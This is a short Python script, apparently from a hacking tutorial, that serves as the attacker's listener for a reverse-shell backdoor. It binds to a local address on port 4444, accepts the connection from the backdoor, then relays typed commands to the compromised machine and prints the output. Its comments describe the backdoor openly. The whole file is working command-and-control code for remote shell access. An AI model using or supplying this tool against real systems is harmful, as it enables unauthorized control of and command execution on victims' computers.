#!/usr/bin/python
import socket


class Listener:
    def __init__(self, ip, port):
        # create a socket object  named listener
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # modify an option so that we can reuse sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # instead of connecting to a destination we binding our socket to our computer so that we listen for incoming connections on port 4444
        listener.bind((ip, port))

        # the number of connections that can be cued before the connections start getting refused
        listener.listen(0)

        print("[+] Waiting for incoming connections")

        # accept the new connection socket object and the address bind to the socket you recieve the connection
        # we capture the two variables that the listener.accept() generates
        self.connection, address = listener.accept()

        # inform the user from where the connection recieved
        print("[+] Got a connection" + str(address))

    def execute_remotely(self, command):
        # we send the command to the backdoor
        self.connection.send(command)
        # wait for the result (system pause for a sec) and stores the result into batches of 1024 bytes
        return self.connection.recv(1024)

    def run(self):
        while True:
            # ask the user for a command
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            # print the result
            print(result)

# use the class in the same file, you can run it from another file is better
my_listener = Listener("192.168.1.8", 4444)
my_listener.run()



